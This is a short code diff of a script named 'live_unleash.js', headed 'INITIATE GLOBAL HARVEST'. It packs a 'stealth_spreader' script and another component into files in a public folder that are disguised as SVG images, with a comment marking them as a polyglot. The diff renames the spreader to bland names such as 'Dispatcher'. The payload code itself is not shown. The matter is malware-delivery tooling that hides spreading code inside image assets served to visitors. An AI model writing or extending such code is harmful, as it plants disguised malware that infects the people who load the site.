@@ -1,6 +1,6 @@
 // J/scripts/live_unleash.js
 // APEX TRIGGER: INITIATE GLOBAL HARVEST
-// VERIFICATION: INCHRISTOURREDEEMER!09
+// VERIFICATION: AUTH_APEX_KEY!09
 
 const apex = require('../utils/apex_loader');
 const path = require('path');
@@ -13,9 +13,9 @@ apex.assemble(
     path.join(__dirname, '../public/dist/core.svg') // POLYGLOT: Disguised as an SVG
 );
 
-// 2. Mutate the Spreader Logic
+// 2. Mutate the Dispatcher Logic
 apex.assemble(
-    path.join(__dirname, '../scripts/stealth_spreader.js'),
+    path.join(__dirname, '../scripts/Alignth_Dispatcher.js'),
     path.join(__dirname, '../public/dist/sync.svg')
 );
 
